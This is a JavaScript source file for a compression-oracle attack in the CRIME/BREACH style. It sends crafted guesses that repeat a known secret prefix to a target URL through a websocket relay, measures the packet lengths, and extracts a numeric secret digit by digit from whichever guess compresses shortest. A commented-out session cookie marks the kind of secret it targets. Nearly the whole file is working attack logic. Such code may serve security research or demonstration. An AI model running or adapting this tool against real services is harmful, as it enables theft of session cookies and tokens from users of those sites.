const request = require('request')
const asyncForEach = require('async-foreach').forEach
const EventEmitter = require('events')
const config = require('./config.json')

// would also contain secret
const url = config.url
const bodyPrefix = '' // 'Cookie: sessionId=876123219; blah blah blah;'
const secretPrefix = config.secretPrefix
const chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
let finalSecret = ''
let ws = null

const sendPayload = (url, payload, done) => {
  if(!ws) return
  ws.send(JSON.stringify({url: url.toString(), payload: payload.toString(), finalSecret: finalSecret, secretLength: config.secretLength, secretPrefix: config.secretPrefix}))
  if (done) setTimeout(done, 400)

}

const generateGuessSequences = (secretPrefix, guess) => {
  // repeat = 3
  return secretPrefix + guess + ' ' + secretPrefix + guess
}

const getRandomString = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

// const randomString = getRandomString() + getRandomString() + getRandomString()
const randomString = 'yyuljtygzvfyo49eq8lnuvmhmzgyow4r5fh8afsqr0szglv7gppm1f1rs7zuvv13y'

const init = (websocket) => {
  finalSecret = ''
  ws = websocket
  const ee = new EventEmitter()
  let baseLength = 0
  // ee.on('packet_length', )
  getBaseLength(ee, (bl) => {
    baseLength = bl
    ee.removeAllListeners()
    console.log('base length:' + baseLength)
    guessAllOracles(ee, baseLength, secretPrefix, (secret) => {
      console.log('secret: ', secret)
      ws.send(JSON.stringify({secret: true, url: url.toString(), finalSecret: secret}))

      ee.removeAllListeners()
      // baseLength += 1
      // // now guess again
      // guessOracle(ee, baseLength, secretPrefix + guessed.toString(), console.log)
    })
  })
  return ee
}

const deInit = (ee) => {
  if (ee) { ee.removeAllListeners() }
}

const guessAllOracles = (ee, bl, guessedSecretPrefix, done) => {
  guessOracle(ee, bl, guessedSecretPrefix, (guessed) => {
    bl += 1
    console.log('guessed: ', guessed)
    finalSecret += guessed.toString()
    if (finalSecret.length < config.secretLength) {
      guessAllOracles(ee, bl, guessedSecretPrefix + guessed, done)
    } else {
      return done(finalSecret)
    }
  })
}

const guessOracle = (ee, bl, guessedSecretPrefix, cb) => {
  // get first character
  const min = bl - 2
  const max = bl + 2
  let packetArr = []

  ee.on('packet_length', (len) => {
    if (min <= bl <= max) {
      console.log(len)
      packetArr.push(len)
      if (packetArr.length === chars.length) {
        const guessed = packetArr.indexOf(Math.min(...packetArr))
        ee.removeAllListeners()
        cb(guessed)
      }
    }
  })

  asyncForEach(chars, function (guess) {
    const done = this.async()
    let payload = bodyPrefix + generateGuessSequences(guessedSecretPrefix, guess.toString()) + ' ' + randomString
    sendPayload(url, payload.toString(), () => {
      done()
    })
  })
}

// the length of the payload before the brute-force
// send a packet 5 times and the length which repeats most is the length
const getBaseLength = (ee, done) => {
  const times = 5
  let count = 0
  const freq = {}
  for (let i = 0; i < times; i++) {
    const payload = bodyPrefix + generateGuessSequences(secretPrefix, '!') + ' ' + randomString
    console.log('getBaseLength: sending.. ' + payload)
    sendPayload(url, payload)
  }
  ee.on('packet_length', (len) => {
    len = len.toString()
    if (count++ > times) return
    // base length is the one with the max count
    if (count === times) {
      let max = 0
      let maxKey = 0
      Object.keys(freq).forEach(k => {
        if (freq[k] > max) {
          max = freq[k]
          maxKey = k
        }
      })
      return done(maxKey)
    }
    if (freq[len] !== undefined) {
      freq[len] += 1
    } else {
      freq[len] = 0
    }
  })
}

// doDaThing()

module.exports = {
  'init': init,
  'deInit': deInit
}
